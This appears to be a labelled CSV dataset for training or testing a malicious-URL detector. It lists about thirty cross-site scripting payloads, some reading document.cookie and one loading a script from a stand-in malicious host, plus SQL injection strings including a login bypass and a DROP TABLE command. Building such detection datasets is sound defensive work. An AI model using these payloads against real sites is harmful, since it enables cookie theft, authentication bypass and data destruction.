url,label
"http://site.com?q=<body onload=alert('xss')>",xss
"http://shop.com/?input=%3Cscript%3Ealert('x')%3C%2Fscript%3E",xss
"http://victim.com/search?q=<script>alert('XSS')</script>",xss
"http://page.com/?value=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",xss
"http://comments.com/post?id=5&comment=<img src=x onerror=alert('x')>",xss
"http://target.com/data?name=<iframe src=javascript:alert(1)>",xss
"http://vulnsite.com/login?user=<script>alert(document.cookie)</script>",xss
"http://site.com/search?q=%3Csvg%20onload%3Dalert(1)%3E",xss
"http://example.org/page?<script>alert(123)</script>",xss
"http://demo.com/form?input=<img src=x onerror=alert('Hacked')>",xss
"http://abc.com/index?q=<script>alert('xss')</script>",xss
"http://test.com/x?val=%3Cscript%3Ealert(99)%3C/script%3E",xss
"http://malicious.net/track?<script>alert(7)</script>",xss
"http://injectxss.com/?<img src=x onerror=alert(3)>",xss
"http://xssattack.com/?q=<svg onload=alert(8)>",xss
"http://insecure.com/?q=<script>alert(document.cookie)</script>",xss
"http://hacker.site/?input=<svg onload=alert(1)>",xss
"http://test.org/?id=%3Ciframe%20src=javascript:alert(2)%3E",xss
"http://xssme.com/page=<script>confirm('xss')</script>",xss
"http://blog.com/comment=<img src=x onerror=alert(1337)>",xss
"http://input.insecure.org/?query=<video src=1 onerror=alert('x')>",xss
"http://site.com/#<svg onload=alert(3)>",xss
"http://evil.com/form?data=<script src='http://malicious.com/xss.js'></script>",xss
"http://unsafe.io/?search=<body onload=alert('xss')>",xss
"http://form.xyz.com/comment=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",xss
"http://xss.me/?q=<script>alert(1)</script>",xss
"http://site.com/input=<img src=x onerror=alert('xss')>",xss
"http://test.org/?id=%3Ciframe%20src=javascript:alert(2)%3E",xss
"http://app.com/login?redirect=<svg onload=alert(1)>",xss
"http://form.insecure.com/comment=%3Cscript%3Econfirm('x')%3C/script%3E",xss
"http://site.com/auth?user=' OR 1=1 --",sql_injection
"http://example.com/search?q=test'%20OR%20'1'%20=%20'1",sql_injection
"http://example.com/items?id=10 OR 1=1",sql_injection
"http://bank.com/transfer?amount=1000&to=1234; DROP TABLE users;",sql_injection
"http://example.com/login?username=admin'--&password=",sql_injection
"http://abc.com/query=' or 'x'='x",sql_injection
